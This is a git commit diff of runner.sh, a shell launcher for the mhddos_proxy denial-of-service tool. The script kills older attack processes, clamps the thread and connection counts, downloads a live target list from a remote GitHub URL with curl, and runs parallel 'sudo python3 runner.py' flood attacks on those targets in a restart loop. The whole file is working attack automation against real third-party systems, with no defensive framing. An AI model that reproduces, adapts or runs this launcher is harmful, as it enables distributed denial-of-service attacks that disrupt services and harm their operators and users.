82218291a4e1c4c81b27012bc3ee5ba77d4f6770
alexnest-ua <74729549+alexnest-ua@users.noreply.github.com>
2022-04-23 04:08:06 +0300

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -3,43 +3,63 @@
 restart_interval="20m"
 
 ulimit -n 1048576
-# TO DELETE WHEN EVERYTHING WILL BE OKAY WITH ORIGINAL REPO
-#cd ~/mhddos_proxy
-#sudo git checkout 49a4c8b034c2f7a5d3d0548e892414a2ebd30076
-#sudo pip3 install -r requirements.txt
+
 
 #Just in case kill previous copy of mhddos_proxy
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
 sudo pkill -e -f runner.py
 sudo pkill -e -f ./start.py
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
-# for Docker
-#echo "Kill all useless docker-containers with MHDDoS"
-#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-#echo "Docker useless containers killed"
 
-proxy_interval="1200"
-proxy_interval="-p $proxy_interval"
 
 num_of_copies="${1:-1}"
+if (("$num_of_copies" == "all"));
+	then	
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mAttack will started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
+		num_of_copies=3
+	elif ((num_of_copies > 3));
+	then 
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mAttack will started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
+		num_of_copies=3
+	elif ((num_of_copies < 1));
+	then
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mAttack will started with 1 parallel attack (less than 1 is not effective)\033[0;0m\n"
+		num_of_copies=1
+	else
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mAttack will started with 1 parallel attack\033[0;0m\n"
+		num_of_copies=1
+fi
 threads="${2:-1500}"
 if ((threads < 1000));
 then
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
 	threads=1000
+elif ((threads > 6000));
+then
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 6000 threads\033[0;0m\n"
+	threads=6000
 fi
 
 rpc="${3:-1000}"
 if ((rpc < 1000));
 then
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too LOW amount of rpc(connections) - attack will be started with 1000 rpc(connections)\033[0;0m\n"
 	rpc=1000
+elif ((rpc > 5000));
+then
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 5000 rpc(connections)\033[0;0m\n"
+	rpc=5000
 fi
 
 debug="${4:-}"
 if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
 then
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --debug (--table is not supported in our script)\033[0;0m\n"
 	debug="--debug"
 fi
 
+echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
+sleep 7s
 
 
 # Restart attacks and update targets list every 10 minutes (by default)
@@ -83,16 +103,16 @@ do
    	for i in $random_numbers
    	do
             echo -e "\n I = $i"
-            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
+            # Filter and only get lines that not start with "#". Then get one target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_docker | cat | grep "^[^#]")")
            
 
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-            echo "sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug"
+            echo "sudo python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
             
             cd ~/mhddos_proxy
-            #sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
-            sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug&
+            #sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $rpc
+            sudo python3 runner.py $cmd_line --rpc $rpc -t $threads $debug&
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
@@ -110,8 +130,4 @@ do
 	sleep $no_ddos_sleep
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
 	
-	# for docker
-   	#echo "Kill all useless docker-containers with MHDDoS"
-   	#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-   	#echo "Docker useless containers killed"
 done
